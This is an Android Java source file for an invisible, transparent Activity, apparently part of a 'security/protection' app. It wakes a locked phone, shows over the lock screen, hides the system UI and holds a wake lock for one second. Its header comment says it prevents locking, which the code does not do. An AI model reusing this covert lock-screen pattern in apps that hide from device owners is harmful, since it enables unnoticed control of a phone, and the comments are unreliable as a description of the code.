package com.seguranca.protecao;

import android.app.Activity;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;

/**
 * 🔒 Activity INVISÍVEL que mantém a tela ligada e IMPEDE o bloqueio
 * Esta Activity aparece por cima do keyguard e força a tela a ficar ligada
 */
public class ScreenPersistenceActivity extends Activity {
    private static final String TAG = "ScreenPersist";
    private PowerManager.WakeLock wakeLock;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        Log.d(TAG, "🔒🔒🔒 ScreenPersistenceActivity CRIADA!");
        
        // Configura flags para aparecer por cima do keyguard e manter tela ligada
        // Configura para aparecer quando bloqueada e ligar a tela
        // NÃO tenta desbloquear/dismiss keyguard para não bugar
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true);
            setTurnScreenOn(true);
        } else {
            getWindow().addFlags(
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
            );
        }
        
        // Flags adicionais para MANTER tela ligada
        getWindow().addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_ALLOW_LOCK_WHILE_SCREEN_ON
        );
        
        // Torna a Activity completamente invisível (transparente)
        getWindow().getDecorView().setSystemUiVisibility(
            View.SYSTEM_UI_FLAG_LAYOUT_STABLE |
            View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
            View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
            View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
            View.SYSTEM_UI_FLAG_FULLSCREEN |
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
        );
        
        // Adquire WakeLock para garantir
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(
            PowerManager.FULL_WAKE_LOCK |
            PowerManager.ACQUIRE_CAUSES_WAKEUP |
            PowerManager.ON_AFTER_RELEASE,
            "UI:ScreenPersistenceActivity"
        );
        wakeLock.acquire();
        Log.d(TAG, "🔒 WakeLock adquirido na Activity!");
        
        // Finaliza após 1 segundo (apenas para forçar a tela a ligar)
        getWindow().getDecorView().postDelayed(() -> {
            Log.d(TAG, "🔒 Finalizando ScreenPersistenceActivity...");
            finish();
        }, 1000);
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
            Log.d(TAG, "🔒 WakeLock liberado na Activity!");
        }
    }
}

